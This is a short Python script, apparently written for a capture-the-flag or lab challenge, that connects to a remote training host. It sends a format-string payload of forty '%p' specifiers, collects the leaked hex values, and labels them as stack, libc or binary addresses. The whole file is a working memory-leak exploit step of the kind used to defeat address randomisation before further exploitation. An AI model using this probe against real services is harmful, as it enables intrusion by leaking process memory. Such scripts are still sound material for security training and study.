import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "chatelaine.cylabacademy.net", 26060
s = socket.create_connection((host, port), timeout=15)
s.settimeout(6)
time.sleep(0.4)
payload = ".".join(["%p"] * 40) + "\n"
s.sendall(payload.encode())
out = b""
t0 = time.time()
while time.time() - t0 < 6:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
        if out.count(b"0x") >= 30:
            break
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== sortie ===")
print(txt[:1200])
vals = re.findall(r"0x[0-9a-f]+", txt)
print("\n%d valeurs" % len(vals))
for i, v in enumerate(vals):
    n = int(v, 16)
    tag = ""
    if 0x7f0000000000 <= n <= 0x7fffffffffff:
        tag = "PILE/LIBC"
    elif 0x400000 <= n <= 0x410000:
        tag = "BINAIRE"
    print("  %2d: %-16s %s" % (i + 1, v, tag))
